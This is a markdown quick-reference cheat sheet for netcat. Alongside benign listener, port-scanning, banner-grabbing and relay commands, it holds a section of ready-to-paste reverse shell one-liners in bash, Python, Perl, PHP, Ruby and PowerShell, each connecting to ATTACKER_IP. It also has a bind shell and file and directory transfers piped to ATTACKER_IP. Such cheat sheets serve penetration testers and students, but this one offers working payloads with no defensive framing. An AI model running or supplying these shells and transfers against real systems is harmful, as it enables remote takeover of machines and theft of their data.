---
title: "netcat CHEATSHEET"
description: "Quick reference for netcat commands and techniques"
---

# netcat CHEATSHEET

## Basic Operations

```bash
nc -lvnp 4444                              # Listen for connections
nc 192.168.1.100 4444                      # Connect to host
nc -u -lvnp 4444                           # UDP listener
nc -u 192.168.1.100 4444                   # UDP connect
nc -h                                      # Show help
```

## Reverse Shells

```bash
# Listener
nc -lvnp 4444

# Bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Netcat -e flag (traditional only)
nc ATTACKER_IP 4444 -e /bin/bash

# Using FIFO (works with all netcat variants)
mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl reverse shell
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP reverse shell
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby reverse shell
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# PowerShell (Windows)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Bind Shells

```bash
# Target (listens and provides shell)
nc -lvnp 4444 -e /bin/bash

# Attacker (connects)
nc 192.168.1.100 4444
```

## Port Scanning

```bash
nc -zv 192.168.1.1 1-1000                  # TCP scan ports 1-1000
nc -zv -w 2 192.168.1.1 21-25 80 443      # Scan with 2s timeout
nc -zvu 192.168.1.1 53 67 68              # UDP scan
```

## File Transfer

```bash
# Send file
nc -lvnp 4444 > received_file              # Receiver
nc ATTACKER_IP 4444 < file_to_send         # Sender

# Send directory
tar czf - /path/to/dir | nc ATTACKER_IP 4444   # Sender
nc -lvnp 4444 | tar xzf -                      # Receiver

# Send with progress
cat file | pv | nc ATTACKER_IP 4444
```

## Banner Grabbing

```bash
# HTTP
nc 192.168.1.1 80
GET / HTTP/1.1
Host: 192.168.1.1

# SMTP
nc 192.168.1.1 25
EHLO test

# FTP
nc 192.168.1.1 21

# SSH
nc 192.168.1.1 22
```

## Persistent Listener

```bash
nc -lvnp 4444 -k                          # Keep listening after disconnect
nc -lvnp 0                                 # Random port assignment
```

## Relay / Pivoting

```bash
# Simple relay
nc -lvnp 4444 | nc TARGET_IP 5555

# Netcat with named pipe relay
mkfifo /tmp/relay
nc -lvnp 4444 < /tmp/relay | nc TARGET_IP 5555 > /tmp/relay
```

## Common Flags

| Flag | Description |
|------|-------------|
| `-l` | Listen mode |
| `-v` | Verbose output |
| `-n` | No DNS resolution |
| `-p PORT` | Specify port |
| `-u` | UDP mode |
| `-z` | Zero-I/O (scanning) |
| `-e CMD` | Execute command on connection (traditional only) |
| `-k` | Keep listening after disconnect |
| `-w SECS` | Timeout for connections |
| `-g GATEWAY` | Source routing hop point |
| `-G NUM` | Source routing pointer |
| `-i SECS` | Delay between lines/ports |
| `-r` | Randomize local/remote ports |
| `-C` | Send CRLF line endings |
